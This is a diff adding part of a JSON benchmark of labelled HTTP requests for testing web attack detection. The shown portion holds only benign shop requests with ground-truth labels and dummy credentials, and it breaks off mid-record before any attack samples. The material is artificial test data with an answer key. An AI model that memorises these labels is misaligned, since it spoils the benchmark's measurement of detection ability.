@@ -1,0 +1,2813 @@
+{
+  "dataset_version": "1.0.0",
+  "dataset_name": "External Public HTTP Security Benchmark (CSIC 2010 & OWASP CRS)",
+  "description": "Standardized external HTTP security benchmark adapted from CSIC 2010 and OWASP CRS for unbiased single-turn HTTP request evaluation without model retraining.",
+  "schema_version": "2.0.0",
+  "total_scenarios": 100,
+  "split_summary": {
+    "external_test_samples": 100,
+    "benign_samples": 50,
+    "attack_samples": 50
+  },
+  "category_counts": {
+    "BENIGN": 50,
+    "SQLI": 12,
+    "TRAVERSAL": 10,
+    "CMDI": 8,
+    "XSS": 8,
+    "PARAM_TAMPERING": 6,
+    "RECON": 6
+  },
+  "content_sha256": "f11d6894b9b5d486785008f2062d88d19263e2330971dae07bd96813741940c3",
+  "scenarios": [
+    {
+      "scenario_id": "EXT-BEN-001",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_001",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/index.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)",
+          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        },
+        "body": "",
+        "client_ip": "192.168.10.101"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-002",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_002",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=1",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8",
+          "accept": "text/html,application/xhtml+xml"
+        },
+        "body": "",
+        "client_ip": "192.168.10.102"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-003",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_003",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=2",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.7) Gecko/2009030814 Firefox/3.0.7",
+          "accept": "text/html,application/xhtml+xml"
+        },
+        "body": "",
+        "client_ip": "192.168.10.103"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-004",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_004",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=3",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1",
+          "accept": "application/xml,text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.104"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-005",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_005",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?id=4",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Opera/9.64 (Windows NT 5.1; U; es-ES) Presto/2.1.1",
+          "accept": "text/html,application/xml"
+        },
+        "body": "",
+        "client_ip": "192.168.10.105"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-006",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_006",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux)",
+          "accept": "text/html,application/xhtml+xml"
+        },
+        "body": "",
+        "client_ip": "192.168.10.106"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-007",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_007",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/vaciar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 6.0; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
+          "accept": "*/*"
+        },
+        "body": "",
+        "client_ip": "192.168.10.107"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-008",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_008",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/pagar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.8)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.108"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-009",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_009",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/autenticacion.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux)",
+          "accept": "text/html,application/xml"
+        },
+        "body": "",
+        "client_ip": "192.168.10.109"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-010",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_010",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/miembros/editar.jsp?id=1",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1; rv:1.9.0.8)",
+          "accept": "text/html",
+          "cookie": "JSESSIONID=A75B492B487A4F8982D5C01389D9FE7B"
+        },
+        "body": "",
+        "client_ip": "192.168.10.110"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-011",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_011",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (compatible; Konqueror/3.5; Linux)",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "id=1&nombre=Lomo+Embuchado&precio=100&cantidad=1&B1=A%F1adir+al+carrito",
+        "client_ip": "192.168.10.111"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-012",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_012",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1; es-ES; rv:1.9.0.8)",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "id=2&nombre=Jamon+Iberico&precio=85&cantidad=2&B1=A%F1adir+al+carrito",
+        "client_ip": "192.168.10.112"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-013",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_013",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (X11; U; Linux i686; en-US)",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "id=3&nombre=Queso+Manchego&precio=30&cantidad=1&B1=A%F1adir+al+carrito",
+        "client_ip": "192.168.10.113"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-014",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_014",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Opera/9.64 (Windows NT 5.1; U; es-ES)",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "id=4&nombre=Chorizo+Iberico&precio=15&cantidad=3&B1=A%F1adir+al+carrito",
+        "client_ip": "192.168.10.114"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-015",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_015",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/anadir.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "id=5&nombre=Salchichon+Iberico&precio=20&cantidad=1&B1=A%F1adir+al+carrito",
+        "client_ip": "192.168.10.115"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-016",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_016",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/registro.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "nombre=Juan&apellidos=Garcia&telefono=912345678&email=juan.garcia%40correo.es&password=juan123&passwordConfirm=juan123&B1=Registrar",
+        "client_ip": "192.168.10.116"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-017",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_017",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/registro.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (X11; Linux x86_64)",
+          "content-type": "application/x-www-form-urlencoded",
+          "accept": "text/html"
+        },
+        "body": "nombre=Maria&apellidos=Lopez&telefono=934567890&email=maria.lopez%40correo.es&password=maria456&passwordConfirm=maria456&B1=Registrar",
+        "client_ip": "192.168.10.117"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-018",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_018",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/miembros/editar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 6.1)",
+          "content-type": "application/x-www-form-urlencoded",
+          "cookie": "JSESSIONID=E5B288F414D62086F9A27F11C",
+          "accept": "text/html"
+        },
+        "body": "nombre=Carlos&apellidos=Sanz&telefono=915551234&email=carlos%40empresa.com&B1=Modificar",
+        "client_ip": "192.168.10.118"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-019",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_019",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/miembros/editar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
+          "content-type": "application/x-www-form-urlencoded",
+          "cookie": "JSESSIONID=F1A348B414C72091A2B38C",
+          "accept": "text/html"
+        },
+        "body": "nombre=Laura&apellidos=Martin&telefono=918889900&email=laura%40universidad.es&B1=Modificar",
+        "client_ip": "192.168.10.119"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-020",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_020",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/pagar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "content-type": "application/x-www-form-urlencoded",
+          "cookie": "JSESSIONID=A75B492B487A4F8982D5C01389D9FE7B",
+          "accept": "text/html"
+        },
+        "body": "titular=Juan+Garcia&tarjeta=1234567890123456&caducidad=12%2F26&cvv=123&B1=Realizar+pago",
+        "client_ip": "192.168.10.120"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-021",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_021",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "POST",
+        "path": "/tienda1/publico/pagar.jsp",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (X11; Linux x86_64)",
+          "content-type": "application/x-www-form-urlencoded",
+          "cookie": "JSESSIONID=E5B288F414D62086F9A27F11C",
+          "accept": "text/html"
+        },
+        "body": "titular=Maria+Lopez&tarjeta=9876543210987654&caducidad=08%2F27&cvv=456&B1=Realizar+pago",
+        "client_ip": "192.168.10.121"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-022",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_022",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?categoria=embutidos&pagina=1",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.122"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-023",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_023",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?categoria=quesos&orden=precio_asc",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.123"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-024",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_024",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/caracteristicas.jsp?categoria=jamones&limite=10",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.124"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-025",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_025",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=jamon+bellota",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 6.1)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.125"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-026",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_026",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=queso+curado",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 6.1)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.126"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-027",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_027",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/publico/buscar.jsp?query=lomo",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "accept": "text/html"
+        },
+        "body": "",
+        "client_ip": "192.168.10.127"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-028",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_028",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/imagenes/logo.png",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "accept": "image/png,image/*"
+        },
+        "body": "",
+        "client_ip": "192.168.10.128"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-029",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_029",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/imagenes/jamon.jpg",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "accept": "image/jpeg,image/*"
+        },
+        "body": "",
+        "client_ip": "192.168.10.129"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-030",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_030",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/estilos/estilo.css",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "accept": "text/css,*/*;q=0.1"
+        },
+        "body": "",
+        "client_ip": "192.168.10.130"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-031",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_031",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/tienda1/scripts/funciones.js",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 5.1)",
+          "accept": "*/*"
+        },
+        "body": "",
+        "client_ip": "192.168.10.131"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-032",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_032",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/favicon.ico",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Windows NT 6.1)",
+          "accept": "image/x-icon,image/*"
+        },
+        "body": "",
+        "client_ip": "192.168.10.132"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-033",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_033",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/robots.txt",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
+          "accept": "text/plain"
+        },
+        "body": "",
+        "client_ip": "192.168.10.133"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-034",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_034",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/sitemap.xml",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (compatible; bingbot/2.0)",
+          "accept": "application/xml"
+        },
+        "body": "",
+        "client_ip": "192.168.10.134"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-035",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_035",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/products",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "192.168.10.135"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
+        "decoy_interactions": 0
+      }
+    },
+    {
+      "scenario_id": "EXT-BEN-036",
+      "split": "external_test",
+      "session_id": "sess_ext_ben_036",
+      "source_dataset": "CSIC_2010_NORMAL",
+      "ground_truth": {
+        "label": "BENIGN",
+        "is_attack": false,
+        "category": "BENIGN",
+        "expected_safety_constraint": "MUST_REACH_ORIGIN"
+      },
+      "request": {
+        "method": "GET",
+        "path": "/api/v1/products/101",
+        "headers": {
+          "host": "localhost:8080",
+          "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+          "accept": "application/json"
+        },
+        "body": "",
+        "client_ip": "192.168.10.136"
+      },
+      "context_features": {
+        "auth_failure_count": 0,
+        "request_frequency": 1.0,
